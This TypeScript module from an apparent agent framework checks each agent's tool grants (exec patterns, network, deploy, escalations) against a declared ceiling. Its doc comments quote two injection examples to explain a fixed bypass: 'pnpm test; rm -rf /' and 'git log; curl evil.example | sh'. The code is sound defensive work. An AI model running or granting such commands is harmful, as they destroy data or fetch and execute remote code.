/**
 * `resolveStepToolGrant` — `PLAN-M13.md` P4: replaces the one hardcoded `DEFAULT_TOOLS` grant
 * (`packages/cli/src/commands/run/context.ts`, applied identically to every dispatched step
 * regardless of which agent is running) with the real, per-dispatched-agent value `05` §5.3's own
 * `tools:`/`ceiling:` blocks already declare — reusing `@forge/extensions/agents`'s own, already-built
 * and already-tested `checkToolCeiling`/`mergeGrants` (`15` §15.3.2) for ceiling/escalation
 * enforcement, rather than re-deriving that logic here.
 *
 * Two grant shapes stay genuinely distinct throughout this module, never conflated: the *ceiling*
 * shape (`@forge/extensions/agents`'s own `ToolGrant` — `write?`/`exec?`/`network?`/`deploy?`/
 * `allowlistHosts?`, the dimensions a project overlay may narrow or widen) is what `checkToolCeiling`
 * reasons over; the *adapter* shape (`@forge/adapter-kit/types`'s own `ToolGrant` — `read`/`write`/
 * `exec: string[] | false`/`network`/optional `allowlistHosts`/`extra`) is what `SessionRequest.tools`
 * actually needs. `deploy` and `git_commit` live only in the former (and in the base agent document) —
 * `SessionRequest` has no field for either; a `deploy`-tagged agent's real capability is realised
 * through its concrete `exec` patterns or MCP grants, so `deploy: true/false` itself is policy input to
 * the ceiling/escalation check alone and is never itself emitted into the resolved adapter grant.
 *
 * No overlay-application mechanism exists anywhere in this codebase yet (confirmed by direct
 * inspection: `@forge/extensions/agents`'s own `AgentOverlay`/`agentOverlaySchema`, M2 P3, has zero
 * callers outside its own package, and `@forge/agents/registry`'s own `AgentRegistry` holds only plain,
 * unmerged `AgentDefinition` values) — so `overlayTools` below is, for now, always `undefined` on
 * every real call `@forge/engine` will actually make. That does *not* mean the ceiling is skipped for
 * every real call today, though: this function always verifies the agent's own base `tools` genuinely
 * fits within its own declared `ceiling` (see "Base-grant integrity" below), independent of whether an
 * overlay is present — a self-inconsistent agent definition (its own `tools` already wider than its own
 * `ceiling`, however that happened) is refused, not trusted. The overlay-accepting path is still built
 * and tested here (not deferred) because `PLAN-M13.md` P4's own Surface names `checkToolCeiling`/
 * `mergeGrants` reuse explicitly, so a future overlay caller (M13 does not build one) has a real, tested
 * seam to call into rather than a second copy of this same logic invented later under time pressure.
 *
 * **Base-grant integrity, and why `exec` is never checked through `checkToolCeiling` itself:**
 * `checkToolCeiling`'s own `exec`/`allowlistHosts` comparison (`excessItems`) is an *exact-string*
 * membership diff, not a wildcard-aware subset check — confirmed empirically against this repository's
 * own shipped `architect.agent.yaml`: `tools.exec` (`['git log*', 'git diff*', ...]`) is semantically
 * narrower than `ceiling.tools.exec` (`['git *', ...]`) but neither `'git log*'` nor `'git diff*'` is a
 * *literal* member of the ceiling's own array, so handing that comparison to `checkToolCeiling` directly
 * would report a false violation against architect's own unmodified, well-formed declaration on every
 * single dispatch. `allowlistHosts` is left with `checkToolCeiling` unchanged: `@forge/adapter-kit/grants`'s own
 * `isHostAllowed` has no wildcard convention, and `excessItems`' exact, case-sensitive comparison can
 * only ever over-refuse a host (never over-grant one) relative to it, the safe direction; `exec` alone is carved out and checked by this module's own `isExecSubsumed`/
 * `patternCoversPattern` — real, wildcard-aware subset reasoning over `07` §7.2's own "exact match, or a
 * single trailing `*`" pattern language. A prefix comparison alone is not enough here, and a first
 * version of this module shipped one and was wrong: `@forge/adapter-kit/grants`'s own real enforcement
 * (`isExecAllowed`/`matchesExecPattern`) refuses a *wildcard* match whenever the whole command contains a
 * shell metacharacter, but deliberately exempts an *exact*-match pattern from that same check — so
 * `patternCoversPattern` imports and reuses `@forge/adapter-kit/grants`'s own `SHELL_OPERATOR_PATTERN`
 * directly (never a second, independently-written copy that could silently drift from the real
 * enforcement-time definition) to refuse treating an exact pattern as "covered" by a wildcard ceiling
 * entry unless that exact pattern is itself free of the shell metacharacters the wildcard's own
 * enforcement-time check would have caught. See `patternCoversPattern`'s own doc comment for the exact
 * bypass this closes.
 *
 * @see specs/05 §5.3
 * @see specs/15 §15.3.2
 * @see PLAN-M13.md P4
 * @see SPEC-QUESTIONS.md Q196
 */
import { ForgeError } from '@forge/core';
import {
  checkToolCeiling,
  isEscalationRefused,
  mergeGrants,
  type Escalation,
  type ToolGrant as ExtToolGrant,
} from '@forge/extensions/agents';
import { SHELL_OPERATOR_PATTERN } from '@forge/adapter-kit/grants';
import type { ToolGrant as AdapterToolGrant } from '@forge/adapter-kit/types';

import type { SeparationOfDutiesRole } from '../interaction/types.ts';
import type { AgentDefinition, AgentToolGrant } from '../schema/types.ts';

/** `05` §5.2's own four separation-of-duties roles, reused verbatim from `@forge/agents/interaction`'s
 * own `SeparationOfDutiesRole` (never a second, independently-invented list) — `checkToolCeiling`'s own
 * `isEscalationRefused` refuses a `write: true` escalation to any of these outright (`15` §15.3.2). */
const REVIEW_OR_CRITIC_ROLES: ReadonlySet<string> = new Set<SeparationOfDutiesRole>([
  'reviewer',
  'critic',
  'diagnostician',
  'test-architect',
]);

/**
 * Agents this codebase's own shipped roster (`modules/fm-core/agents/*.agent.yaml`, 28 files) trusts
 * with `deploy: true` in either `tools` or `ceiling` — `sre` is the *only* one that declares it
 * anywhere, confirmed by direct inspection, and matches `05` §5.2's own roster table ("SRE / DevOps ...
 * deploy strategy, rollback"). `checkToolCeiling`'s own worked example
 * (`packages/extensions/test/agents/ceiling.test.ts`) uses `sre` as its own `OPS`-tagged agent for the
 * identical reason. No spec table enumerates an "ops role" set explicitly — recorded as a judgement
 * call in `SPEC-QUESTIONS.md` Q196 rather than silently guessed; fail-closed, so an unlisted role is
 * never treated as ops and a `deploy:true` escalation naming it is refused, never silently granted.
 */
const OPS_ROLES: ReadonlySet<string> = new Set(['sre']);

export interface RoleTags {
  readonly isReviewOrCritic: boolean;
  readonly isOps: boolean;
}

/**
 * `checkToolCeiling`'s own `roleTags` parameter, derived from `agentId` alone — every existing caller
 * in this codebase (`safety-scan.ts`, I7's own `ToolCeilingCheckInput`) currently supplies this by
 * hand; this is the first, single real classification, so a per-step dispatch resolver and any future
 * caller never invent two different answers for the same agent id.
 *
 * **Disclosed, not silently solved — `roster.split` (`15` §15.3.3).** A project may split a protected
 * role (e.g. `reviewer`) into several new, narrower ids (e.g. `reviewer-security`), each tagged
 * `isReviewOrCritic: false` here — a real gap, since a write-widening escalation naming such a sibling
 * would then not be refused the way one naming `reviewer` itself is. Deliberately *not* mitigated by
 * also checking the split sibling's own `extends` field: confirmed by direct inspection, `15` §15.3.3's
 * own shipped `roster.split` config shape (`@forge/extensions/agents`'s own `splitSiblingSchema`,
 * `{id, skills?, file_ownership?}`, `.strict()`) carries no lineage field at all — a real split sibling,
 * as a project author actually writes one, cannot declare `extends` even if they wanted to, so checking
 * it here would fix nothing real and would introduce a genuine new false positive of its own (any
 * *unrelated* agent that legitimately sets `extends: reviewer` purely to inherit tooling/prompt shape
 * would become permanently unable to receive a `write:true` escalation, regardless of whether that is
 * appropriate for it). Left as a real, named gap instead: nothing in this codebase constructs a real
 * `AgentDefinition` for a split sibling yet (the identical "no overlay mechanism exists" gap this
 * module's own top doc comment already names for `AgentOverlay`) — whoever eventually builds that
 * materialization is responsible for ensuring a split sibling of a protected role is classified
 * correctly at that point, either by extending `REVIEW_OR_CRITIC_ROLES` with the real resulting id(s)
 * or by giving this function real lineage information once a real mechanism defines what that lineage
 * actually looks like. `SPEC-QUESTIONS.md` Q196.
 */
export function roleTagsForAgent(agentId: string): RoleTags {
  return {
    isReviewOrCritic: REVIEW_OR_CRITIC_ROLES.has(agentId),
    isOps: OPS_ROLES.has(agentId),
  };
}

/** A bare boolean `tools.network` (`05` §5.3's own worked example writes `network: false` at this
 * layer, `ToolGrant`'s own three-value enum at the ceiling layer two dozen lines later for the
 * identical field — the base schema accepts both forms without normalizing, `schema/types.ts`'s own
 * `AgentToolGrant` doc comment) resolves here, once, in the same fail-closed direction as every other
 * unresolved dimension in this module: `false` -> `'none'`; a bare `true` (no shipped agent uses one,
 * but the schema legally allows it) -> `'allowlist'`, never `'full'` — a bare boolean carries no
 * `allowlistHosts` of its own, but `'allowlist'` is still strictly narrower than granting unrestricted
 * `'full'` network access for a dimension the agent author never actually chose a concrete value for.
 * `SPEC-QUESTIONS.md` Q196. */
function normalizeNetwork(value: AgentToolGrant['network']): 'none' | 'allowlist' | 'full' {
  if (value === false) return 'none';
  if (value === true) return 'allowlist';
  return value;
}

/** `agent.tools`, converted to the ceiling-check shape (`@forge/extensions/agents`'s own `ToolGrant`)
 * — built field-by-field, never by spreading `agent.tools` directly, since the base document's own
 * `read`/`git_commit` fields have no place in that shape at all (see this module's own doc comment). */
function baseGrantForCeilingCheck(tools: AgentToolGrant): ExtToolGrant {
  return {
    write: tools.write,
    ...(tools.exec !== undefined ? { exec: tools.exec } : {}),
    network: normalizeNetwork(tools.network),
    deploy: tools.deploy,
  };
}

/** `grant`'s own genuinely-defined fields only. `AgentCeiling.tools`'s own type (`CeilingToolGrant`,
 * `schema/types.ts`) allows an explicit `field: undefined` for `exactOptionalPropertyTypes` reasons
 * `checkToolCeiling`'s own plain `ToolGrant` parameter does not accept — the identical "filter before
 * spreading" step `ceiling.ts`'s own `mergeGrants` already takes for its `escalation` argument, applied
 * here so a ceiling read straight off a parsed `AgentDefinition` is always safe to hand to it. */
function stripUndefinedFields(grant: Readonly<Record<string, unknown>>): ExtToolGrant {
  return Object.fromEntries(Object.entries(grant).filter(([, value]) => value !== undefined));
}

/** `grant`, with its own `exec` field removed entirely (never merely set to `undefined` — a key that is
 * present but `undefined` and a key that is genuinely absent behave differently for
 * `exactOptionalPropertyTypes`, the identical distinction `stripUndefinedFields` already exists for).
 * Used so `checkToolCeiling` never itself evaluates `exec` — that dimension is checked separately, by
 * `isExecSubsumed`, for the exact-string-vs-wildcard reason this module's own top doc comment gives. */
function omitExec(grant: ExtToolGrant): ExtToolGrant {
  return Object.fromEntries(Object.entries(grant).filter(([key]) => key !== 'exec'));
}

/**
 * Whether granting `pattern` alone (a `07` §7.2 exec pattern: an exact string, or a single trailing `*`
 * as a prefix wildcard) could ever let through, at real enforcement time
 * (`@forge/adapter-kit/grants`'s own `isExecAllowed`/`matchesExecPattern`), a command that `covering`
 * enforced on its own would not also have let through. A real, wildcard-aware subset check, unlike
 * `checkToolCeiling`'s own exact-string `excessItems`.
 *
 * **Not a simple prefix comparison — `matchesExecPattern` treats a wildcard match and an exact match
 * asymmetrically, and this function must too.** A wildcard pattern's own enforcement-time match refuses
 * any command containing a shell metacharacter (`SHELL_OPERATOR_PATTERN`, `@forge/adapter-kit/grants`'s
 * own `exec.ts` — the S2 defence against `exec: ['pnpm test*']` matching `'pnpm test; rm -rf /'` via
 * plain prefix composition); an *exact*-match pattern is deliberately exempt from that check ("the
 * operator was written out in full, character for character, explicitly authorised, not smuggled in").
 * A first version of this function compared prefixes alone and missed this: granting an *exact* pattern
 * like `'git log; curl evil.example | sh'` was reported "covered" by a ceiling entry `'git *'` purely
 * because the string starts with `'git '` — but at real enforcement time that exact pattern would be
 * granted *unconditionally* (exact matches skip the shell-operator check entirely), letting through a
 * composed command the ceiling's own wildcard entry, enforced on its own, would have refused. Fixed:
 * an exact `pattern` is covered by a wildcard `covering` only when it *both* starts with the ceiling's
 * own prefix *and* itself contains no shell metacharacter — i.e. only when `pattern` is exactly the
 * shape of command the wildcard ceiling entry would already have allowed through on its own. A
 * wildcard-to-wildcard comparison needs no such check: both sides already carry the identical
 * enforcement-time shell-operator filter, so it cancels out of the subset comparison unchanged.
 */
function patternCoversPattern(covering: string, pattern: string): boolean {
  if (!covering.endsWith('*')) {
    // `covering` matches exactly one command; `pattern` can only be covered by it if `pattern` also
    // matches only that exact same command.
    return pattern === covering;
  }
  const coveringPrefix = covering.slice(0, -1);
  if (!pattern.endsWith('*')) {
    return pattern.startsWith(coveringPrefix) && !SHELL_OPERATOR_PATTERN.test(pattern);
  }
  const patternPrefix = pattern.slice(0, -1);
  return patternPrefix.startsWith(coveringPrefix);
}

/** The entries of `exec` not covered by any entry of `ceilingExec` (`patternCoversPattern`) — empty
 * when every entry is covered. An absent `ceilingExec` is treated as an empty set —
 * `checkToolCeiling`'s own identical `ceiling ?? []` fail-closed reading of "no declared ceiling for
 * this dimension" — so any real `exec` pattern against an undeclared ceiling exec is correctly reported
 * as uncovered, never silently passed. */
function uncoveredExecPatterns(
  exec: readonly string[] | undefined,
  ceilingExec: readonly string[] | undefined,
): readonly string[] {
  const ceiling = ceilingExec ?? [];
  return (exec ?? []).filter(
    (pattern) => !ceiling.some((covering) => patternCoversPattern(covering, pattern)),
  );
}

/** Every entry of `exec` is covered by at least one entry of `ceilingExec`; an absent or empty `exec` is
 * trivially subsumed (nothing to exceed). */
function isExecSubsumed(
  exec: readonly string[] | undefined,
  ceilingExec: readonly string[] | undefined,
): boolean {
  return uncoveredExecPatterns(exec, ceilingExec).length === 0;
}

/** Whether `escalation` is still active at `now` (epoch milliseconds, caller-injected — never an
 * uninjected `Date.now()`, the same determinism rule this codebase applies everywhere else a real
 * instant matters). `checkToolCeiling` itself matches an escalation by agent id alone and never reads
 * `expires` (`@forge/extensions/module`'s own `ceiling.ts` doc comment names this explicitly for the
 * sibling module-ceiling check) — an already-expired escalation record reaching it unfiltered would
 * silently keep suppressing a real ceiling violation past its own recorded expiry, a genuine
 * grant-widening bypass this function exists specifically to close. An unparseable `expires` is treated
 * as already lapsed, the identical fail-closed direction `isModuleEscalationActive` already takes. */
function isEscalationActiveNow(escalation: Escalation, now: number): boolean {
  const expiresAt = Date.parse(escalation.expires);
  return !Number.isNaN(expiresAt) && expiresAt > now;
}

/**
 * The `exec` ceiling `isExecSubsumed` should actually check against: `ceilingExec` *replaced* by a
 * matching, active, non-refused escalation's own `exec` (if it declares one; replace, not union — the
 * same override semantics `mergeGrants` gives every other field, so an escalation naming a narrower
 * `exec` narrows this ceiling too, a false refusal at worst, never a widening) — mirroring
 * `checkToolCeiling`'s own internal `mergeGrants(ceiling, escalation.grant)` step (`ceiling.ts`) for the
 * one dimension that check never itself evaluates here. Only ever the *first* escalation naming this
 * agent, the identical `escalations.find` selection `checkToolCeiling` itself uses — never a different
 * selection strategy for `exec` than for every other dimension.
 */
function escalatedCeilingExec(
  ceilingExec: readonly string[] | undefined,
  agentId: string,
  roleTags: RoleTags,
  escalations: readonly Escalation[],
): readonly string[] | undefined {
  const escalation = escalations.find((entry) => entry.agent === agentId);
  if (escalation === undefined || isEscalationRefused(escalation, roleTags)) return ceilingExec;
  return escalation.grant.exec ?? ceilingExec;
}

/** `exec`, with an absent or empty list normalised to adapter-kit's own explicit "deny every command"
 * value (`false`) — `07` §7.2's own `ToolGrant.exec` doc comment and `@forge/adapter-kit/grants`'s own
 * `isExecAllowed` already treat the two identically at enforcement time; this makes that reading
 * explicit in the resolved value itself, rather than leaving "no patterns" ambiguous between "nothing
 * granted" and "an oversight that happens to allow nothing yet." */
function toAdapterExec(exec: readonly string[] | undefined): readonly string[] | false {
  return exec === undefined || exec.length === 0 ? false : exec;
}

function toAdapterGrant(grant: ExtToolGrant, read: boolean): AdapterToolGrant {
  return {
    read,
    write: grant.write ?? false,
    exec: toAdapterExec(grant.exec),
    network: grant.network ?? 'none',
    ...(grant.allowlistHosts !== undefined ? { allowlistHosts: grant.allowlistHosts } : {}),
  };
}

export interface ResolveStepToolGrantInput {
  readonly agent: AgentDefinition;
  /** A project overlay's own requested `tools:` override for this step's agent (`15` §15.3.1) —
   * `undefined` resolves to the agent's own declared `tools` verbatim (this module's own doc comment:
   * no real caller produces a value here anywhere in this codebase yet). */
  readonly overlayTools?: ExtToolGrant | undefined;
  /** Every configured escalation, unfiltered — this function itself narrows to the ones naming
   * `agent.id` and still active at `now`. Pre-typed `Escalation[]`, deliberately: `.forge/config.yaml`
   * `security.toolCeilingEscalations` is still schema-typed `unknown[]` (`SPEC-QUESTIONS.md` Q196) — a
   * caller sourcing this list from that config field is responsible for its own real validation before
   * calling this function, which does not itself trust an unvalidated shape into `checkToolCeiling`. */
  readonly escalations: readonly Escalation[];
  readonly now: number;
}

export interface ResolveStepToolGrantResult {
  readonly grant: AdapterToolGrant;
  readonly usedEscalation: boolean;
}

/**
 * `agent`'s own resolved, per-step tool grant, in the exact shape `SessionRequest.tools`/
 * `ExecuteStepContext` need — `PLAN-M13.md` P4. Throws `RUN-077` (never returns a wider grant than is
 * actually justified) whenever the resolved request — the agent's own base `tools`, with any
 * `overlayTools`-touched field actually changed — exceeds `agent.ceiling` with no covering, unexpired
 * escalation: "a grant above the ceiling is refused," never silently narrowed to fit and never silently
 * widened past what was actually approved. This check runs unconditionally whenever the agent declares
 * a real `ceiling` — not only when `overlayTools` is given — so a self-inconsistent base declaration
 * (its own `tools` already wider than its own `ceiling`) is refused too, not trusted by default.
 */
export function resolveStepToolGrant(input: ResolveStepToolGrantInput): ResolveStepToolGrantResult {
  const { agent, overlayTools, escalations, now } = input;
  const baseGrant = baseGrantForCeilingCheck(agent.tools);
  const mergedGrant = overlayTools === undefined ? baseGrant : mergeGrants(baseGrant, overlayTools);

  // Fail closed: an agent with no declared ceiling permits no widening at all — the base grant itself
  // is then the only value the resolved request may legally equal or narrow from, so this trivially
  // passes when there is no overlay and refuses any overlay that asks for more.
  const ceiling =
    agent.ceiling !== undefined ? stripUndefinedFields(agent.ceiling.tools) : baseGrant;
  const roleTags = roleTagsForAgent(agent.id);
  const activeEscalations = escalations.filter(
    (escalation) => escalation.agent === agent.id && isEscalationActiveNow(escalation, now),
  );

  // `exec` is checked separately (wildcard-aware, `isExecSubsumed`) against its own
  // escalation-widened ceiling; `checkToolCeiling` below evaluates every other dimension, with `exec`
  // omitted from both sides so its own exact-string comparison never runs on it at all. The escalated
  // ceiling is only computed when the plain one doesn't already cover the request — no escalation
  // lookup on the common, already-within-ceiling path.
  const execAllowedPlain = isExecSubsumed(mergedGrant.exec, ceiling.exec);
  const execCeiling = execAllowedPlain
    ? ceiling.exec
    : escalatedCeilingExec(ceiling.exec, agent.id, roleTags, activeEscalations);
  const execAllowed = execAllowedPlain || isExecSubsumed(mergedGrant.exec, execCeiling);

  const nonExecResult = checkToolCeiling(
    agent.id,
    roleTags,
    omitExec(ceiling),
    omitExec(mergedGrant),
    activeEscalations,
  );

  if (!nonExecResult.allowed || !execAllowed) {
    const violations = [
      ...(nonExecResult.allowed ? [] : nonExecResult.violations),
      ...(execAllowed
        ? []
        : [
            {
              field: 'exec',
              detail: `requests exec patterns outside the ceiling: ${uncoveredExecPatterns(mergedGrant.exec, execCeiling).join(', ')}`,
            },
          ]),
    ];
    const detail = violations
      .map((violation) => `${violation.field}: ${violation.detail}`)
      .join('; ');
    throw new ForgeError('RUN-077', { agentId: agent.id, detail });
  }

  return {
    grant: toAdapterGrant(mergedGrant, agent.tools.read),
    // `execAllowed` is unconditionally true here (the throw above already returned otherwise) — only
    // `!execAllowedPlain` (exec needed the escalation) still varies.
    usedEscalation: nonExecResult.usedEscalation || !execAllowedPlain,
  };
}
